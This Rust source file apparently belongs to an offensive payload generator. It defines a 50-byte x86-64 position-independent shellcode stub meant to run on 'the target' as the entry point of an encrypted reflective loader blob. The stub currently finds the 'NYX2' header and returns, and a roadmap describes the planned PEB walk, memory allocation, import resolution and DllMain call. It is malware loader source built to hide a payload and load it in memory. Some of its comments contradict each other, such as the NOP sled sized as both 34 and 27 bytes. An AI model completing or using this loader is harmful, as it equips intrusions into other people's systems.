//! Raw x86-64 PIC loader stub shellcode.
//!
//! This is a **host-side constant** — the bytes are emitted into every generated
//! payload by [`crate::generate_loader_stub`]. The stub does NOT run on the build
//! host; it is position-independent x86-64 code that executes as the entry point
//! of the reflective loader blob on the target.
//!
//! ## Payload layout (what the stub sees in memory)
//!
//! ```text
//! [PIC_STUB (50 bytes)][NYX2 magic (4B)][encrypted_len LE (4B)][nonce (12B)][ciphertext (N bytes)][Poly1305 tag (16B)]
//! ```
//!
//! The stub is at offset 0 (entry point). It self-locates via `call/pop`, then
//! walks **forward** past its own code to find the `NYX2` magic marker. Once found:
//!
//! 1. Reads `encrypted_len` (u32 LE) from `[magic+4]`
//! 2. Reads the 12-byte nonce from `[magic+8]`
//! 3. Decrypts `ciphertext || tag` at `[magic+20]`
//!
//! ## Phase 2b roadmap
//!
//! Currently the stub only locates the NYX2 header and returns. The actual
//! reflective PE loading logic (PEB walk, `NtAllocateVirtualMemory`, copy
//! sections, process relocations, resolve imports, call `DllMain`) will replace
//! the `ret` placeholder in a follow-up. The resolver function pointer will be
//! patched in at build time by `generate_loader_stub`.

/// The PIC stub shellcode — 50 bytes of position-independent x86-64.
///
/// Disassembly:
///
/// ```asm
/// ; ── self-locate (6 bytes) ─────────────────────────────────────────────
/// 0000: E8 00 00 00 00    call   $+5        ; push return address (= offset 0x0005)
/// 0005: 5B                pop    rbx        ; rbx = 0x0005 (address of this pop)
///
/// ; ── search loop: find "NYX2" magic (13 bytes) ────────────────────────
/// ; Layout: [stub][NYX2=0x3258594E LE][enc_len][nonce][ciphertext||tag]
/// ; rbx starts 5 bytes into the stub. We walk forward looking for the magic.
/// 0006: 81 7B 4E 59 58 32 cmp    dword [rbx], 0x3258594E  ; "NYX2" as LE u32
/// 000C: 74 05             je     +0x13       ; jump to 'found' (offset 0x13)
/// 000E: 48 FF C3          inc    rbx         ; step forward one byte
/// 0011: EB F3             jmp    -0x0D       ; loop back to cmp (offset 0x06)
///
/// ; ── found: parse NYX2 header (4 bytes) ───────────────────────────────
/// ; rbx points to the 'N' of "NYX2"
/// 0013: 8B 43 04          mov    eax, [rbx+4]  ; eax = encrypted_len (u32 LE)
/// ; nonce is at [rbx+8] (12 bytes)
/// ; ciphertext is at [rbx+20] (4 magic + 4 len + 12 nonce)
///
/// ; ── placeholder: return to caller (1 byte) ──────────────────────────
/// ; TODO(Phase 2b part 2): replace with jump to reflective PE resolver.
/// ; The resolver will be patched into the NOP sled below (offset 0x17).
/// 0016: C3                ret
///
/// ; ── NOP sled: reserved for future resolver code (34 bytes) ──────────
/// ; Total stub size: 23 bytes core + 27 bytes NOP = 50 bytes.
/// 0017: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
/// 0027: 90 90 90 90 90 90 90 90 90 90 90
/// ```
pub const PIC_STUB: &[u8] = &[
    // ── self-locate ─────────────────────────────────────────────────────
    0xE8, 0x00, 0x00, 0x00, 0x00, // call $+5
    0x5B, // pop rbx
    // ── search loop ─────────────────────────────────────────────────────
    0x81, 0x7B, 0x4E, 0x59, 0x58, 0x32, // cmp dword [rbx], 0x3258594E
    0x74, 0x05, // je +5 → found
    0x48, 0xFF, 0xC3, // inc rbx
    0xEB, 0xF3, // jmp -13 → search loop
    // ── found: parse header ─────────────────────────────────────────────
    0x8B, 0x43, 0x04, // mov eax, [rbx+4]  ; eax = encrypted_len
    // ── placeholder return ──────────────────────────────────────────────
    0xC3, // ret
    // ── NOP sled: reserved for Phase 2b resolver ────────────────────────
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 8 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 8 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 8 NOPs
    0x90, 0x90, 0x90, // 3 NOPs (total 27 NOPs)
];

/// Size of the PIC stub in bytes.
pub const PIC_STUB_LEN: usize = PIC_STUB.len();

/// NYX2 magic value as a little-endian u32: bytes 'N' 'Y' 'X' '2' in memory.
/// The stub compares `dword [rbx]` against this value.
pub const NYX2_MAGIC: u32 = 0x3258594E;

/// Offset from the magic marker to the `encrypted_len` field (u32 LE).
pub const ENCRYPTED_LEN_OFFSET: usize = 4;

/// Offset from the magic marker to the 12-byte nonce.
pub const NONCE_OFFSET: usize = 8;

/// Offset from the magic marker to the start of the ciphertext (after magic +
/// encrypted_len + nonce = 4 + 4 + 12 = 20).
pub const CIPHERTEXT_OFFSET: usize = 20;

/// Size of the Poly1305 authentication tag appended to the ciphertext.
pub const TAG_LEN: usize = 16;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn stub_is_50_bytes() {
        assert_eq!(PIC_STUB.len(), 50);
    }

    #[test]
    fn magic_is_nyx2_le() {
        // "NYX2" in ASCII: N=0x4E, Y=0x59, X=0x58, 2=0x32
        // Little-endian u32: bytes in memory are 4E 59 58 32 → 0x3258594E
        let magic_bytes = NYX2_MAGIC.to_le_bytes();
        assert_eq!(magic_bytes, [0x4E, 0x59, 0x58, 0x32]);
    }

    #[test]
    fn stub_starts_with_call() {
        // call $+5 = E8 00 00 00 00
        assert_eq!(&PIC_STUB[0..5], &[0xE8, 0x00, 0x00, 0x00, 0x00]);
    }

    #[test]
    fn stub_ends_with_nops() {
        // Last 27 bytes should all be 0x90 (NOP)
        assert!(PIC_STUB[23..].iter().all(|&b| b == 0x90));
    }
}
